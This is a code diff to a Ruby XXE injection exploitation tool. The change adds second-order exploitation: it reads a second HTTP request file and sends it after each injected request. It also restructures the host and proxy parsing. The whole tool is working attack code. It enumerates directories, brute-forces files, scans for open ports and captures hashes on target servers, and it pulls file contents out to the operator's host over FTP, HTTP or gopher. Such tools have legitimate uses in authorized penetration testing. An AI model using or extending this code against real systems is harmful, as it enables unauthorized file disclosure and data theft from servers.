@@ -12,6 +12,7 @@ require 'readline'
 host = "" # our external ip
 path = "" # path to enumerate
 $file = "" # file with vulnerable HTTP request
+$secfile = "" # file with second request (2nd order)
 enum = "ftp" # which out of band protocol should be used for file retrieval - ftp/http/gopher
 logger = "n" # only log requests, do not send anything
 
@@ -72,6 +73,7 @@ ARGV.each do |arg|
 	logger = "y" if arg.include?("--logger")
 	brute = "logger" if arg.include?("--logger")
 	output = arg.split("=")[1] if arg.include?("--output=")
+	$secfile = arg.split("=")[1] if arg.include?("--2ndfile=")
 end
 
 # show DTD to inject
@@ -107,10 +109,11 @@ if ARGV.nil? || (ARGV.size < 3 && logger == "n") || (host == "" && $direct == ""
 	puts "  --file	Mandatory - File containing valid HTTP request with xml. You can also mark with \"XXEINJECT\" a point where DTD should be injected. (--file=/tmp/req.txt)"
 	puts "  --path	Mandatory if enumerating directories - Path to enumerate. (--path=/etc)"
 	puts "  --brute	Mandatory if bruteforcing files - File with paths to bruteforce. (--brute=/tmp/brute.txt)"
-	puts "  --logger	Log results only. Do not send requests."
+	puts "  --logger	Log results only. Do not send requests. HTTP logger looks for \"p\" parameter with results."
 	puts ""
 	puts "  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)"
 	puts "  --direct		Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --xml to see how XML in request file should look like. (--direct=UNIQUEMARK)"
+	puts "  --2ndfile		File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)"
 	puts "  --phpfilter		Use PHP filter to base64 encode target file before sending."
 	puts "  --enumports		Enumerating unfiltered ports for reverse connection. Specify value \"all\" to enumerate all TCP ports. (--enumports=21,22,80,443,445)"
 	puts ""
@@ -139,6 +142,8 @@ if ARGV.nil? || (ARGV.size < 3 && logger == "n") || (host == "" && $direct == ""
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl"
 	puts "  Enumerating /etc directory using gopher for OOB method:"
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher"
+	puts "  Second order exploitation:"
+	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt"
 	puts "  Bruteforcing files using HTTP out of band method:"
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http"
 	puts "  Enumerating using direct exploitation:"
@@ -216,6 +221,36 @@ end
 
 ### Processing Request File ###
 
+# Configure basic options
+
+# set proxy
+if $proxy == ""
+	$proxy = nil
+	$proxy_port = nil
+end
+
+# get connection host and port
+if logger == "n"
+	z = 1
+	loop do
+		break if File.readlines($file)[z].chomp.empty?
+		if File.readlines($file)[z].include?("Host: ")
+			$remote = File.readlines($file)[z].split(" ")[1]
+			if $proto == "http"
+				$port = 80
+			else
+				$port = 443
+			end
+			if $remote.include?(":")
+				$port = $remote.split(":")[1]
+				$remote = $remote.split(":")[0]
+			end
+		end
+		z = z + 1
+	end
+end
+
+# Configure main request
 def configreq()
 
 	found = 0 # for detecting injected DTD
@@ -263,25 +298,6 @@ def configreq()
 				found = found + 1
 			end
 		end
-	end
-
-	# get connection host and port
-	i = 1
-	loop do
-		break if File.readlines($file)[i].chomp.empty?
-		if File.readlines($file)[i].include?("Host: ")
-			$remote = File.readlines($file)[i].split(" ")[1]
-			if $proto == "http"
-				$port = 80
-			else
-				$port = 443
-			end
-			if $remote.include?(":")
-				$port = $remote.split(":")[1]
-				$remote = $remote.split(":")[0]
-			end
-		end
-		i = i + 1
 	end
 
 	# get headers
@@ -421,12 +437,6 @@ def configreq()
 		puts "Multiple instances of XML found. It may results in false-positives."
 	end
 
-	# set proxy
-	if $proxy == ""
-		$proxy = nil
-		$proxy_port = nil
-	end
-
 	# configuring request
 	$request = Net::HTTP.new($remote, $port, $proxy, $proxy_port)
 
@@ -438,6 +448,56 @@ def configreq()
 end
 
 ### End of Processing Request File ###
+
+### Configure request for 2nd order case ###
+if $secfile != ""
+
+	# check HTTP method
+	if File.readlines($secfile)[0].include?("GET ")
+		$secmethod = "get"
+	end
+
+	# get URI path
+	$securi = File.readlines($secfile)[0].split(" ")[1]
+
+	# get headers
+	y = 1
+	$secheaders = Hash.new
+	loop do
+		break if File.readlines($secfile)[y].chomp.empty?
+		if !File.readlines($secfile)[y].include?("Host: ")
+			header = File.readlines($secfile)[y].chomp
+			if header.include?("Accept-Encoding")
+			else
+				$secheaders[header.split(": ")[0]] = header.split(": ")[1]
+			end
+		end
+		y = y + 1
+	end
+
+	# get POST body
+	y = y + 1
+	$secpost = ""
+	if $method == "post"
+		loop do
+			break if File.readlines($secfile)[y].nil?
+			postline = File.readlines($secfile)[y]
+			$secpost += postline
+			y = y + 1
+		end
+	end
+
+	# configuring 2nd request
+	$secrequest = Net::HTTP.new($remote, $port, $proxy, $proxy_port)
+
+	# set HTTPS
+	if $proto == "https"
+		$secrequest.use_ssl = true
+		$secrequest.verify_mode = OpenSSL::SSL::VERIFY_NONE
+	end
+end
+
+### End of Processing 2nd Request File ###
 
 # Sending request
 def sendreq()
@@ -469,6 +529,43 @@ def sendreq()
 					$response = r.post($uri, $post, $headers) 
 				else
 					$response = r.get($uri, $headers)
+				end
+  			}
+		rescue Timeout::Error
+		end
+	}
+end
+
+# Sending second request
+def send2ndreq()
+	
+	if $verbose == "y"
+		puts "Sending second request:"
+		if $proto == "http"
+			puts "http://#{$remote}:#{$port}#{$securi}"
+			puts $secheaders
+			puts "\n"
+			puts $secpost
+			puts "\n"
+		else
+			puts "https://#{$remote}:#{$port}#{$securi}"
+			puts $secheaders
+			puts "\n"
+			puts $secpost
+			puts "\n"
+		end
+	else
+		puts "Sending second request."
+	end
+	
+	$response = ""
+	$secrequest.start { |r|
+		begin
+			status = Timeout::timeout($time) {
+    				if $method == "post"
+					$response = r.post($securi, $secpost, $secheaders) 
+				else
+					$response = r.get($securi, $secheaders)
 				end
   			}
 		rescue Timeout::Error
@@ -936,6 +1033,7 @@ if enumports != ""
 				end
 				configreq()
 				sendreq()
+				send2ndreq() if $secfile != ""
 				j = j + 1
 			rescue Errno::EADDRINUSE
 				puts "Cannot bind to #{j} port."
@@ -959,6 +1057,7 @@ if enumports != ""
 				end
 				configreq()
 				sendreq()
+				send2ndreq() if $secfile != ""
 			rescue Errno::EADDRINUSE
 				puts "Cannot bind to #{tcpport} port."
 			end
@@ -994,6 +1093,10 @@ if upload != ""
 	  end		
 	end
 	end
+	sendreq()
+	loop do
+		sleep(10000)
+	end
 end
 
 # TCP server for XSLT injection test
@@ -1008,6 +1111,7 @@ if $xslt == "y"
 	end
 	end
 	sendreq()
+	send2ndreq() if $secfile != ""
 	sleep timeout
 	puts "XSLT is not working."
 	exit(1)
@@ -1018,6 +1122,7 @@ if hashes == "y"
 	puts "Start msfconsole with auxiliary/server/capture/smb. Press enter when started."
 	Readline.readline("> ", true)
 	sendreq()
+	send2ndreq() if $secfile != ""
 	sleep(10)
 	puts "Check msfconsole for hashes."
 	Readline.readline("> ", true)
@@ -1031,11 +1136,13 @@ if brute == ""
 		switch = 1
 		puts "Enumeration locked." if $verbose == "y"
 		sendreq()
+		send2ndreq() if $secfile != ""
 	else
 		done = 0
 		$directpath = path
 		configreq()
 		sendreq()
+		send2ndreq() if $secfile != ""
 		if !$response.body.include?("#{$direct}")
 			puts "Response does not contain unique mark."
 			exit(1)
@@ -1168,6 +1275,7 @@ loop do
 					end
 					enumpath[0] = "" if enumpath[0] == "/"
 					sendreq()
+					send2ndreq() if $secfile != ""
 				else
 					if $direct != ""
 						$directpath = "#{path}\\#{line}"
@@ -1176,6 +1284,7 @@ loop do
 						enumpath = "#{path}\\#{line}"
 					end
 					sendreq()
+					send2ndreq() if $secfile != ""					
 				end
 
 				# Loop that checks if response with next file content was received by FTP/HTTP servers
@@ -1303,6 +1412,7 @@ loop do
 			configreq()
 		end
 		sendreq()
+		send2ndreq() if $secfile != ""
 
 		if $direct != ""
 			if not $response.body.include?("#{$direct}")
